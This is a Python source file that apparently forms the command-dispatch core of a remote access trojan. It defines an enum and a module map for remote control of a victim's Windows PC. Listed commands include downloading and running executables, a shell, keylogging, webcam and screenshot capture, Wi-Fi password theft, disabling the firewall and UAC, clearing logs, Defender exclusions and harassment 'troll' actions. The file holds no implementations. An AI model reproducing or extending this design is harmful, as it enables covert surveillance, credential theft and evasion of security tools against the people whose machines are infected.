from abc import ABC, abstractmethod
from enum import Enum
from pydantic import BaseModel



class Command(Enum):
    # File System Commands
    DOWNLOAD_FILE_HTTP = "DOWNLOAD_FILE_HTTP"
    DOWNLOAD_RUN_EXE = "DOWNLOAD_RUN_EXE"
    GET_START_UP_CONTENTS = "GET_START_UP_CONTENTS"
    CHDIR = "CHDIR"
    GETCWD = "GETCWD"
    LIST_CURRENT_DIRECTORY = "LIST_CURRENT_DIRECTORY"
    DELETE_FILE = "DELETE_FILE"
    DELETE_FOLDER = "DELETE_FOLDER"
    MAKE_DIRECTORY = "MAKE_DIRECTORY"
    SPAM_FOLDERS = "SPAM_FOLDERS"
    MAKE_SHORTCUT = "MAKE_SHORTCUT"
    MOVE_FILE = "MOVE_FILE"
    SHELL = "SHELL"
    # Input/Output Commands
    BLOCK = "BLOCK"
    UNBLOCK = "UNBLOCK"
    GET_BLOCK_STATUS = "GET_BLOCK_STATUS"
    REVERSE_MOUSE_BUTTONS = "REVERSE_MOUSE_BUTTONS"
    BLOCK_SECS = "BLOCK_SECS"

    GET_CLIPBOARD = "GET_CLIPBOARD"
    PASTE_TO_CLIPBOARD = "PASTE_TO_CLIPBOARD"
    CLIPBOARD_FILLER = "CLIPBOARD_FILLER"
    FILLER_OFF = "FILLER_OFF"
    GET_CLIPBOARD_FILLER_STATUS = "GET_CLIPBOARD_FILLER_STATUS"
    
    GET_FOREGROUND_WINDOW_TITLE = "GET_FOREGROUND_WINDOW_TITLE"
    STOP_DISABLER = "STOP_DISABLER"
    DISABLE_CURRENT_WINDOWS_CONTINOUS = "DISABLE_CURRENT_WINDOWS_CONTINOUS"
    ENABLE_CURRENT_WINDOW = "ENABLE_CURRENT_WINDOW"
    DISABLE_CURRENT_WINDOW = "DISABLE_CURRENT_WINDOW"
    DISABLE_WINDOW_STATUS = "DISABLE_WINDOW_STATUS"

    # Surveillance Commands
    SCREENSHOT = "SCREENSHOT"
    START_KEYLOG = "START_KEYLOG"
    STOP_KEYLOG = "STOP_KEYLOG"
    EXPORT_KEYLOG_TEXT = "EXPORT_KEYLOG_TEXT"

    GET_AVAILABLE_DEVICES = "GET_AVAILABLE_DEVICES"
    START_CAMERA = "START_CAMERA"

    # System Commands
    CREATE_ACCOUNT = "CREATE_ACCOUNT"
    GET_ACCOUNTS = "GET_ACCOUNTS"
    
    DISABLE_CMD_FULLY = "DISABLE_CMD_FULLY"
    DISABLE_CMD = "DISABLE_CMD"
    ENABLE_CMD = "ENABLE_CMD"
    
    FIREWALL_ON = "FIREWALL_ON"
    FIREWALL_OFF = "FIREWALL_OFF"
    
    GET_CPU_USAGE = "GET_CPU_USAGE"
    GET_RAM_USAGE_INFO = "GET_RAM_USAGE_INFO"
    GET_DISK_USAGE_INFO = "GET_DISK_USAGE_INFO"
    GET_DISK_INFO = "GET_DISK_INFO"
    GET_COMPLETE_SYS_INFO = "GET_COMPLETE_SYS_INFO"
    
    GET_HOSTFILE_CONTENTS = "GET_HOSTFILE_CONTENTS"
    WRITE_HOSTFILE_CONTENTS = "WRITE_HOSTFILE_CONTENTS"
    GET_INSTALLED_PROGRAMS = "GET_INSTALLED_PROGRAMS"
    RUN_UNINSTALLER = "RUN_UNINSTALLER"
    ENABLE_INTERNET = "ENABLE_INTERNET"
    DISABLE_INTERNET = "DISABLE_INTERNET"
    
    CLEAR_LOGS = "CLEAR_LOGS"
    GET_LOGS = "GET_LOGS"
    
    GET_ADAPTER_STATS = "GET_ADAPTER_STATS"
    GET_ADAPTERS = "GET_ADAPTERS"
    GET_DEVICES_ON_NETWORK = "GET_DEVICES_ON_NETWORK"
    GET_WIFI_NETWORKS = "GET_WIFI_NETWORKS"
    GET_WIFI_PASSWORDS = "GET_WIFI_PASSWORDS"
    GET_IP_INFO = "GET_IP_INFO"
    GET_COUNTRY = "GET_COUNTRY"
    GET_PUBLIC_IP = "GET_PUBLIC_IP"
    
    MINIMIZE_ALL_WINDOWS = "MINIMIZE_ALL_WINDOWS"
    FREEZE_PC = "FREEZE_PC"
    LOGOUT = "LOGOUT"
    RESTART = "RESTART"
    SHUTDOWN = "SHUTDOWN"
    
    KILL_PROCESS = "KILL_PROCESS"
    GET_PROCESSES = "GET_PROCESSES"
    
    GEO_LOCATE = "GEO_LOCATE"
    GET_USERNAME = "GET_USERNAME"
    GET_UPTIME = "GET_UPTIME"
    GET_SYSTEM_INFO = "GET_SYSTEM_INFO"
    
    ENABLE_TASKMANAGER = "ENABLE_TASKMANAGER"
    DISABLE_TASKMANAGER = "DISABLE_TASKMANAGER"

    # Troll Commands
    SHOW_MESSAGE_BOX = "SHOW_MESSAGE_BOX"
    RUN_TROLL_SCRIPT = "RUN_TROLL_SCRIPT"
    OPEN_CAMERA_APP = "OPEN_CAMERA_APP"
    CHANGE_WALLPAPER_HTTP = "CHANGE_WALLPAPER_HTTP"
    EJECT_CD = "EJECT_CD"
    EJECT_CD_CONTINOUS = "EJECT_CD_CONTINOUS"
    STOP_CD_EJECTOR = "STOP_CD_EJECTOR"
    TYPE_MESSAGE_NOTEPAD = "TYPE_MESSAGE_NOTEPAD"
    SHOW_WEBSITE = "SHOW_WEBSITE"
    START_WINDOW_TROLL = "START_WINDOW_TROLL"
    STOP_WINDOW_TROLL = "STOP_WINDOW_TROLL"

    # Persistence Commands
    ADD_EXTENSION_EXCLUSION = "ADD_EXTENSION_EXCLUSION"
    REMOVE_EXTENSION_EXCLUSION = "REMOVE_EXTENSION_EXCLUSION"
    ADD_FOLDER_EXCLUSION = "ADD_FOLDER_EXCLUSION"
    REMOVE_FOLDER_EXCLUSION = "REMOVE_FOLDER_EXCLUSION"
    STOP_SAMPLING = "STOP_SAMPLING"

    ENABLE_UAC = "ENABLE_UAC"
    DISABLE_UAC = "DISABLE_UAC"
    
command_to_module_map = {
    # File System Commands
    Command.DOWNLOAD_FILE_HTTP: "download",
    Command.DOWNLOAD_RUN_EXE: "download",
    
    Command.GET_START_UP_CONTENTS: "file_system",
    Command.CHDIR: "file_system",
    Command.GETCWD: "file_system",
    Command.LIST_CURRENT_DIRECTORY: "file_system",
    Command.DELETE_FILE: "file_system",
    Command.DELETE_FOLDER: "file_system",
    Command.MAKE_DIRECTORY: "file_system",
    Command.SPAM_FOLDERS: "file_system",
    Command.MAKE_SHORTCUT: "file_system",
    Command.MOVE_FILE: "file_system",
    Command.SHELL: "file_system",

    Command.BLOCK: "block_input",
    Command.UNBLOCK: "block_input",
    Command.REVERSE_MOUSE_BUTTONS: "block_input",
    Command.GET_BLOCK_STATUS: "block_input",
    Command.BLOCK_SECS: "block_input",
    
    Command.GET_CLIPBOARD: "clipboard",
    Command.PASTE_TO_CLIPBOARD: "clipboard",
    Command.CLIPBOARD_FILLER: "clipboard",
    Command.FILLER_OFF: "clipboard",
    Command.GET_CLIPBOARD_FILLER_STATUS : "clipboard",
    
    Command.GET_FOREGROUND_WINDOW_TITLE: "window",
    Command.STOP_DISABLER: "window",
    Command.DISABLE_CURRENT_WINDOWS_CONTINOUS: "window",
    Command.ENABLE_CURRENT_WINDOW: "window",
    Command.DISABLE_CURRENT_WINDOW: "window",
    Command.DISABLE_WINDOW_STATUS: "window",

    # Surveillance Commands
    
    Command.SCREENSHOT: "visuals",
    Command.GET_AVAILABLE_DEVICES: "surveillance",
    Command.START_CAMERA: "surveillance",
    Command.START_KEYLOG: "keylog",
    Command.STOP_KEYLOG: "keylog",
    Command.EXPORT_KEYLOG_TEXT: "keylog",

    # System Commands
    Command.CREATE_ACCOUNT: "accounts",
    Command.GET_ACCOUNTS: "accounts",
    
    Command.DISABLE_CMD_FULLY: "cmd",
    Command.DISABLE_CMD: "cmd",
    Command.ENABLE_CMD: "cmd",
    
    Command.FIREWALL_ON: "firewall",
    Command.FIREWALL_OFF: "firewall",
    
    Command.GET_CPU_USAGE: "hardware",
    Command.GET_RAM_USAGE_INFO: "hardware",
    Command.GET_DISK_USAGE_INFO: "hardware",
    Command.GET_DISK_INFO: "hardware",
    Command.GET_COMPLETE_SYS_INFO: "hardware",
    
    Command.GET_HOSTFILE_CONTENTS: "hostfile",
    Command.WRITE_HOSTFILE_CONTENTS: "hostfile",
    
    Command.GET_INSTALLED_PROGRAMS: "programs",
    Command.RUN_UNINSTALLER: "programs",
    
    Command.ENABLE_INTERNET: "internet",
    Command.DISABLE_INTERNET: "internet",
    
    Command.CLEAR_LOGS: "logs",
    Command.GET_LOGS: "logs",
    
    Command.GET_ADAPTER_STATS: "network",
    Command.GET_ADAPTERS: "network",
    Command.GET_DEVICES_ON_NETWORK: "network",
    Command.GET_WIFI_NETWORKS: "network",
    Command.GET_WIFI_PASSWORDS: "network",
    Command.GET_IP_INFO: "network",
    Command.GET_COUNTRY: "network",
    Command.GET_PUBLIC_IP: "network",
    
    Command.MINIMIZE_ALL_WINDOWS: "pc",
    Command.FREEZE_PC: "pc",
    Command.LOGOUT: "pc",
    Command.RESTART: "pc",
    Command.SHUTDOWN: "pc",
    
    Command.KILL_PROCESS: "process",
    Command.GET_PROCESSES: "process",
    
    Command.GEO_LOCATE: "sys_info",
    Command.GET_USERNAME: "sys_info",
    Command.GET_UPTIME: "sys_info",
    Command.GET_SYSTEM_INFO: "sys_info",
    
    Command.ENABLE_TASKMANAGER: "taskmanager",
    Command.DISABLE_TASKMANAGER: "taskmanager",

    # Troll Commands
    Command.SHOW_MESSAGE_BOX: "troll",
    Command.RUN_TROLL_SCRIPT: "troll",
    Command.OPEN_CAMERA_APP: "troll",
    Command.CHANGE_WALLPAPER_HTTP: "troll",
    Command.START_WINDOW_TROLL : "window_troll",
    Command.STOP_WINDOW_TROLL : "window_troll",

    Command.EJECT_CD: "cd",
    Command.EJECT_CD_CONTINOUS: "cd",
    Command.STOP_CD_EJECTOR: "cd",
    Command.TYPE_MESSAGE_NOTEPAD: "type_message",
    Command.SHOW_WEBSITE: "website_spam",

    # Persistence Commands
    Command.ADD_EXTENSION_EXCLUSION: "defender",
    Command.REMOVE_EXTENSION_EXCLUSION: "defender",
    Command.ADD_FOLDER_EXCLUSION: "defender",
    Command.REMOVE_FOLDER_EXCLUSION: "defender",
    Command.STOP_SAMPLING: "defender",

    Command.ENABLE_UAC: "uac",
    Command.DISABLE_UAC: "uac",
}


class CommandArgs(BaseModel):
    class Config:
        extra = "allow"

class CommandResult(BaseModel):
    result: str | list | dict
    success: bool

class ICommandModule(ABC):
    @abstractmethod
    def run(self, command: Command, args: CommandArgs) -> CommandResult | None:
        pass